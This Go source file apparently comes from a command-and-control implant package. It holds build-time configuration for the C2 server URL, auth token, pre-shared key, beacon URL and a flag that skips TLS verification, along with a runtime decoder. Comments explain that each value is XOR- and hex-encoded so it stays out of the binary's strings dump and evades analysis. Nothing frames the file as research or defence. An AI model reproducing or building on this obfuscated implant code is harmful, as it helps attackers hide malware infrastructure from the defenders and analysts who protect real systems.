// Build-time injected configuration via -ldflags "-X c2agent.<var>=<hex>".
//
// Why hex-encoded: Go's -X linker flag writes the literal string into the
// binary's read-only data segment, so passing a plaintext C2 URL / token /
// PSK would land in the strings dump verbatim. Instead the build script
// XOR-encodes each value with the same obfKey used by xor.go and hex-encodes
// the result; ldDecode() reverses hex -> XOR -> plaintext at runtime.
//
// Injection format (see outputs/stream-stub/build.sh):
//   -X c2agent.ldC2Server=$(xorhex "wss://.../agent")
//   -X c2agent.ldC2AuthToken=$(xorhex "<64hex>")
//   -X c2agent.ldC2PSK=$(xorhex "<40hex>")
//   -X c2agent.ldC2BeaconURL=$(xorhex "https://.../beacon")
//
// Empty injected string == not configured; callers fall through to the
// runtime env vars, then to the XOR-baked literals (xor.go) / baked secrets.
package main

import (
	"encoding/hex"
	"strings"
)

var (
	// ldC2Server is the XOR+hex-encoded primary C2 endpoint URL.
	ldC2Server string
	// ldC2AuthToken is the XOR+hex-encoded agent auth token.
	ldC2AuthToken string
	// ldC2PSK is the XOR+hex-encoded app-level AEAD pre-shared key.
	ldC2PSK string
	// ldC2BeaconURL is the XOR+hex-encoded explicit HTTP beacon URL.
	ldC2BeaconURL string
	// ldC2InsecureTLS is the XOR+hex-encoded InsecureTLS flag ("1" to skip TLS verify).
	ldC2InsecureTLS string
)

// ldDecode reverses the build-time encoding (hex -> XOR with obfKey). An
// empty or malformed string yields "" so callers treat it as "not injected".
func ldDecode(enc string) string {
	enc = strings.TrimSpace(enc)
	if enc == "" {
		return ""
	}
	raw, err := hex.DecodeString(enc)
	if err != nil {
		return ""
	}
	return xob(raw)
}

// ldInjected reports whether any build-time value was injected (diagnostics).
func ldInjected() bool {
	return strings.TrimSpace(ldC2Server) != "" ||
		strings.TrimSpace(ldC2AuthToken) != "" ||
		strings.TrimSpace(ldC2PSK) != "" ||
		strings.TrimSpace(ldC2BeaconURL) != "" ||
		strings.TrimSpace(ldC2InsecureTLS) != ""
}

// ldInsecureTLS returns true if a build-time InsecureTLS flag was injected as "1".
func ldInsecureTLS() bool {
	return ldDecode(ldC2InsecureTLS) == "1"
}
